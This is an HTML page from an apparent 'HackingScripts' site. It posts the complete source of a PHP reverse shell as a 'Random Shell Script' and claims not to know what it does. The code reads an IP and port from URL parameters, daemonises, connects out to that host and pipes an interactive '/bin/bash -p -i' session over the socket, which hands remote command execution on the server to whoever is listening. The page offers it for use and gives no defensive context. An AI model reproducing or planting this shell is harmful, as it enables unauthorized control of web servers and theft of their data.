<!DOCTYPE html>
<html>
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/stylesheet.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/pygment_trac.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/print.css" media="print" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/styles.css" media="print" />
    <link rel="icon" type="image/x-icon" href="/HackingScripts/favicon.ico">


    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <title> Random Shell Script </title>
  </head>

  <body>
    <header>
      <div class="inner">
        <h1> <a href="/HackingScripts/">HackingScripts</a> </h1>
        <h2>Hack Scripts for everybody</h2>
      </div>
    </header>

    <div id="content-wrapper">
      <div class="inner clearfix">
        <section id="main-content">

          <h2>Random Shell Script</h2>
<p class="meta">25 Jan 2014</p>

<p>A random shell script.. I don&#8217;t know what this one does, or find any information on it. I don&#8217;t even know what it&#8217;s called! Anyway, it is very nicely written and commented.</p>

<h2>Random Shell Script Source Code</h2>

<pre class="brush: php; title: ; notranslate" title="">&lt;?php
set_time_limit (0);
$VERSION = "1.0";
$ip = $_GET["ip"]; 
$port = $_GET["port"]; 
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = '/bin/bash -p -i';
$daemon = 0;
$debug = 0;
 
if (function_exists('pcntl_fork')) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
 
    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }
 
    if ($pid) {
        exit(0);  // Parent exits
    }
 
    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }
 
    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
 
// Change to a safe directory
chdir("/");
 
// Remove any umask we inherited
umask(0);
 
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}
 
// Spawn shell process
$descriptorspec = array(
   0 =&gt; array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 =&gt; array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 =&gt; array("pipe", "w")   // stderr is a pipe that the child will write to
);
 
$process = proc_open($shell, $descriptorspec, $pipes);
 
if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}
 
// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
 
printit("Successfully opened reverse shell to $ip:$port");
 
while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }
 
    // Check for end of STDOUT
    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }
 
    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
 
    // If we can read from the TCP socket, send
    // data to process's STDIN
    if (in_array($sock, $read_a)) {
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }
 
    // If we can read from the process's STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }
 
    // If we can read from the process's STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }
}
 
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
 
// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
    if (!$daemon) {
        print "$string\n";
    }
}
?&gt;
</pre>



        </section>

        <aside id="sidebar">
          <a href="/HackingScripts/upload/" class="button">
            <small>Upload</small>
            a file
          </a>


          <a href="/HackingScripts/scripts/" class="button">
            <small>The entire list of</small>
            hack scripts
          </a>
          <!--
          <p class="repo-owner"><a href="https://github.com/jasonlong/architect-theme">architect-theme</a> is maintained by <a href="https://github.com/jasonlong">jasonlong</a>.</p>

          <p class="repo-owner"><a href="https://github.com/pietromenna/jekyll-architect-theme">jekyll-architect-theme</a> is maintained by <a href="https://github.com/pietromenna">pietromenna</a>.</p>

          <p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
      -->
        </aside>

      </div>
    </div>

  </body>
</html>
